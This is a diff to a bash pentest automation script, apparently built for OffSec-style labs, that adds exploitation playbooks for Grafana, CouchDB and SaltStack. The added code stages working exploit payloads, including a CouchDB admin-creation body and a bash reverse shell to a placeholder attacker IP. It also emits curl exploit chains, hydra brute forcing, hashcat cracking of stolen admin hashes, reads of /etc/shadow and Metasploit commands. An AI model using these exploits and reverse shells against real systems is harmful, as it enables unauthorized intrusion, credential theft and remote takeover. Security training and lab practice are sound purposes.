+            "curl -sk http://$ip:3000/api/health" \
+            "curl -sk http://$ip:3000/login | grep -oE 'Grafana v[0-9.]+' | head -1" \
+            "" \
+            "# Step 2 — run the path-traversal probe (tries all standard plugin slugs):" \
+            "bash $grafana_probe" \
+            "" \
+            "# DECIDE: probe prints 'VULN via plugin: <x>' → proceed to step 3 with that plugin name;" \
+            "# DECIDE: probe prints 'No vulnerable plugin slug matched' → target patched, skip to step 4 brute;" \
+            "# DECIDE: /api/health returns 401 or requires cookie → anonymous disabled, CVE-2021-43798 still works (no auth on /public/plugins/)." \
+            "" \
+            "# Step 3 — read grafana.ini + grafana.db, crack bcrypt admin hash offline (hashcat mode 3200):" \
+            "bash $grafana_read <VULN_PLUGIN>" \
+            "# hashcat -m 3200 <hash-file> /usr/share/wordlists/rockyou.txt" \
+            "" \
+            "# Step 4 — login brute fallback (default creds admin:admin first):" \
+            "curl -sk -X POST http://$ip:3000/login -H 'Content-Type: application/json' -d '{\"user\":\"admin\",\"password\":\"admin\"}'" \
+            "timeout 10m hydra -l admin -P /usr/share/wordlists/fasttrack.txt -s 3000 $ip http-post-form '/login:{\"user\":\"^USER^\",\"password\":\"^PASS^\"}:Invalid username'" \
+            "" \
+            "searchsploit --cve CVE-2021-43798" \
+            "# CHEAT: vault/_CHEATSHEETS/Exploit_Research.md §4 Exploit Type Reference" \
+            "# TODO: vault has no §Grafana — add the plugin-slug loop + grafana.db hashcat-3200 workflow"
+    fi
+
+    # --- CouchDB :5984 — CVE-2017-12635 admin create + CVE-2017-12636 query_servers RCE ---
+    # Evidence-gated: port 5984 alone is ambiguous. Require a CouchDB marker
+    # in a fingerprint file produced by enum_http on port 5984. Stage the two
+    # exploit JSON bodies to files per AGENTS.md §6 — both are exploit-payload-shaped.
+    local couchdb_port_dir="$target_dir/tcp/http/port_5984"
+    if detected_tcp_port "$target_dir" "5984" && [[ -d "$couchdb_port_dir" ]] && \
+        grep -qiE 'CouchDB|Apache CouchDB|"couchdb":"Welcome"' \
+            "$couchdb_port_dir/whatweb.txt" "$couchdb_port_dir/curl_headers.txt" 2>/dev/null; then
+        local couchdb_loot="$target_dir/loot"
+        local couchdb_admin_body="$couchdb_loot/couchdb_cve-2017-12635.admin-create.json"
+        local couchdb_rev_body="$couchdb_loot/couchdb_cve-2017-12636.revshell.json"
+        mkdir -p "$couchdb_loot"
+        cat > "$couchdb_admin_body" <<'COUCHDB_ADMIN'
+{"type":"user","name":"pwn","roles":["_admin"],"roles":[],"password":"pwn"}
+COUCHDB_ADMIN
+        cat > "$couchdb_rev_body" <<'COUCHDB_REV'
+"/bin/bash -c 'bash -i >& /dev/tcp/KALI_IP/4444 0>&1'"
+COUCHDB_REV
+        append_next_finding "$next_file" \
+            "CouchDB detected on :5984" \
+            "nmap shows :5984 open AND $couchdb_port_dir fingerprint matched CouchDB marker; exploit bodies staged at $couchdb_loot/couchdb_cve-*.json" \
+            "# Step 0 — start reverse-shell listener on Kali BEFORE triggering step 3 (AGENTS.md §3 convention):" \
+            "penelope -0 -p 4444" \
+            "# Edit $couchdb_rev_body and replace KALI_IP with your tun0 IP before step 3." \
+            "" \
+            "# Step 1 — fingerprint version (CVE-2017-12635 affects <1.7.0 and <2.1.1; CVE-2022-24706 needs Erlang port):" \
+            "curl -sk http://$ip:5984/" \
+            "curl -sk http://$ip:5984/_all_dbs              # admin-only on patched; open on unauth-misconfig" \
+            "curl -sk http://$ip:5984/_node/_local/_config/admins  # lists admin users (401 on authed)" \
+            "" \
+            "# Step 2 — CVE-2017-12635 admin creation via duplicate-key JSON (no auth needed):" \
+            "curl -sk -X PUT 'http://$ip:5984/_users/org.couchdb.user:pwn' -H 'Content-Type: application/json' --data @$couchdb_admin_body" \
+            "" \
+            "# DECIDE: response '{\"ok\":true,...}' with 201 Created → admin 'pwn:pwn' created, proceed to step 3;" \
+            "# DECIDE: 400 Bad Request with 'duplicate field' → parser patched, pivot to default creds (admin:admin) or step 4 Erlang;" \
+            "# DECIDE: 403 Forbidden → server admin party disabled or auth required, stop." \
+            "" \
+            "# Step 3 — CVE-2017-12636 authenticated RCE via query_servers config push (as new admin; step 0 listener must be up):" \
+            "curl -sk -u pwn:pwn -X PUT 'http://$ip:5984/_node/_local/_config/query_servers/cmd' -H 'Content-Type: application/json' --data @$couchdb_rev_body" \
+            "# Create a db and document with the language=cmd map function to trigger:" \
+            "curl -sk -u pwn:pwn -X PUT 'http://$ip:5984/trigger'" \
+            "curl -sk -u pwn:pwn -X POST 'http://$ip:5984/trigger' -H 'Content-Type: application/json' -d '{\"_id\":\"exp\",\"language\":\"cmd\",\"views\":{\"v\":{\"map\":\"function(){}\"}}}'" \
+            "curl -sk -u pwn:pwn 'http://$ip:5984/trigger/_design/exp/_view/v'   # fires the query_server" \
+            "" \
+            "# DECIDE: query returns normally → shell should have landed on the Step 0 penelope listener;" \
+            "# DECIDE: query returns 500 → view not invoking query_server, retry with _update handler instead of _view." \
+            "" \
+            "# Step 4 — CVE-2022-24706 default Erlang cookie (requires :4369 epmd + a random Erlang dist port):" \
+            "nmap -sT -p 4369,9100-9200 $ip" \
+            "# If :4369 open → epmd service discovery:" \
+            "epmd -names -address $ip 2>/dev/null || nc -v $ip 4369" \
+            "# Exploitation (erl required): erl -setcookie monster -remsh couchdb@<hostname> → :os.cmd('id') on remote node" \
+            "" \
+            "searchsploit --cve CVE-2017-12635" \
+            "searchsploit --cve CVE-2022-24706" \
+            "# CHEAT: vault/_CHEATSHEETS/Exploit_Research.md §4 Exploit Type Reference" \
+            "# TODO: vault has no §CouchDB — add duplicate-key admin create + query_servers RCE + Erlang-cookie chain"
+    fi
+
+    # --- SaltStack master (:4505/:4506) — CVE-2020-11651 + CVE-2020-11652 ---
+    # Runs before the generic KB emitter so the operator reads the specific
+    # handoff (manual PoC + msf fallback + decision tree) first. The generic
+    # KB stanza for 4505/4506 that follows is low-noise residual.
+    if detected_tcp_port "$target_dir" "4505" || detected_tcp_port "$target_dir" "4506"; then
+        local salt_api_port="" _salt_candidate
+        for _salt_candidate in 8000 8080 8443; do
+            if detected_tcp_port "$target_dir" "$_salt_candidate"; then
+                salt_api_port="$_salt_candidate"
+                break
+            fi
+        done
+        append_next_finding "$next_file" \
+            "SaltStack master detected (:4505/:4506)" \
+            "nmap_tcp.nmap shows SaltStack ZMTP ports — CVE-2020-11651 + CVE-2020-11652 candidate" \
+            "# Step 1 — confirm master is reachable and unpatched:" \
+            "nc -nv $ip 4506 </dev/null                      # connect → server hello OK" \
+            "${salt_api_port:+curl -sk http://$ip:${salt_api_port}/login | head -20    # salt-api landing}" \
+            "${salt_api_port:+curl -sk http://$ip:${salt_api_port}/run                 # POST endpoint used by exploit}" \
+            "" \
+            "# Step 2 — manual PoC (auth bypass → arbitrary salt-call as root):" \
+            "git clone https://github.com/dozernz/cve-2020-11651 /tmp/salt_cve 2>/dev/null || true" \
+            "# Alternative PoC if dozernz is down: github.com/jasperla/CVE-2020-11651-poc" \
+            "python3 /tmp/salt_cve/exploit.py --master $ip --exec 'id'" \
+            "python3 /tmp/salt_cve/exploit.py --master $ip --read-file /etc/shadow" \
+            "python3 /tmp/salt_cve/exploit.py --master $ip --exec 'bash -c \"bash -i >& /dev/tcp/\${KALI_IP}/4444 0>&1\"'" \
+            "" \
+            "# NOTE: OffSec engagement — using msf here counts against your one-machine budget. Prefer step 2." \
+            "# Step 3 — Metasploit fallback (enumerate minions + execute on them):" \
+            "msfconsole -qx \"use exploit/linux/misc/saltstack_salt_api_cmd_exec; set RHOSTS $ip; set LHOST \${KALI_IP}; ${salt_api_port:+set RPORT ${salt_api_port}; }run\"" \
+            "" \
+            "# DECIDE: exploit returns output → RCE as root confirmed, pivot to minions via salt '*' cmd.run;" \
+            "# DECIDE: 'Method not found' or auth_check OK → master is patched (>=3000.2, >=2019.2.4), stop;" \
+            "# DECIDE: connection refused on 4506 but 4505 open → firewall between Kali and master, try through proxychains;" \
+            "# DECIDE: salt-api port absent → master unreachable via HTTP, only ZMTP direct — PoC still works via raw 4506." \
+            "" \
+            "searchsploit --cve CVE-2020-11651" \
+            "# CHEAT: vault/_CHEATSHEETS/Exploit_Research.md §4 Exploit Type Reference" \
+            "# TODO: vault has no §SaltStack — add one after engagement with the PoC clone + three exec patterns above"
     fi
 
     # --- OffSec service-port knowledge base → generic pointers ---
@@ -3340,7 +3824,8 @@ generate_next_steps() {
             "# --- Top CVEs per service (dedup, sort by CVSS) ---" \
             "awk -F'\\t' '{print \$2, \$3}' $target_dir/loot/vulners_hits.txt | sort -u" \
             "# --- searchsploit sweep of flagged CVEs ---" \
-            "grep -oE 'CVE-[0-9]+-[0-9]+' $target_dir/loot/vulners_hits.txt | sort -u | head -50 | while read cve; do echo \"=== \$cve ===\"; searchsploit --cve \"\$cve\"; done"
+            "grep -oE 'CVE-[0-9]+-[0-9]+' $target_dir/loot/vulners_hits.txt | sort -u | head -50 | while read cve; do echo \"=== \$cve ===\"; searchsploit --cve \"\$cve\"; done" \
+            "# CHEAT: vault/_CHEATSHEETS/Exploit_Research.md §1 Vet Before You Dig"
     fi
 
     if ! grep -q '^## ' "$next_file" 2>/dev/null; then
